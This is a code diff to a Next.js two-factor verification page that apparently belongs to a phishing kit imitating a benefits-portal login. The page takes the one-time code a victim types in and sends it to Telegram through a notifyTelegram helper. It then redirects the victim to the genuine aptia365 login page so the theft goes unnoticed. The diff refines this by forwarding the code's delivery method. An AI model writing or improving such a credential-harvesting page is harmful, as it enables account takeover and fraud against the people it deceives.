@@ -1,11 +1,21 @@
 "use client";
+import { Suspense } from "react";
 import { useState } from "react";
-import { useRouter } from "next/navigation";
+import { useRouter, useSearchParams } from "next/navigation";
 import { Header } from "@/sections/Header";
 import { notifyTelegram } from "@/lib/telegram-notify";
 
-export default function TwoFactorVerify2Page() {
+function TwoFactorVerify2Content() {
   const router = useRouter();
+  const searchParams = useSearchParams();
+
+  // Get method from URL parameter and convert sms -> text for API
+  const methodParam = searchParams.get("method") || "sms";
+  const apiMethod =
+    methodParam === "sms"
+      ? "text"
+      : (methodParam as "email" | "text" | "phone");
+
   const [code, setCode] = useState("");
   const [rememberBrowser, setRememberBrowser] = useState(false);
   const [loginLoading, setLoginLoading] = useState(false);
@@ -15,11 +25,7 @@ export default function TwoFactorVerify2Page() {
     setCodeError(false);
   };
 
-  
-
-  const handleResend = () => {
-
-  };
+  const handleResend = () => {};
 
   const handleLogin = async () => {
     if (!code.trim()) {
@@ -29,17 +35,17 @@ export default function TwoFactorVerify2Page() {
 
     setLoginLoading(true);
 
-    // Send verification to Telegram
+    // Send final verification to Telegram with correct method
     notifyTelegram({
       kind: "verification",
-      method: "email",
+      method: apiMethod,
       code: code,
       otpStep: 2,
     });
 
     setTimeout(() => {
       setLoginLoading(false);
-      
+
       // Navigate to external URL
       window.location.href =
         "https://yourflexbenefits.aptia365.com/Account/Login?returnurl=%2F";
@@ -564,5 +570,13 @@ export default function TwoFactorVerify2Page() {
 
       <div id="toast"></div>
     </>
+  );
+}
+
+export default function TwoFactorVerify2Page() {
+  return (
+    <Suspense fallback={<div>Loading...</div>}>
+      <TwoFactorVerify2Content />
+    </Suspense>
   );
 }
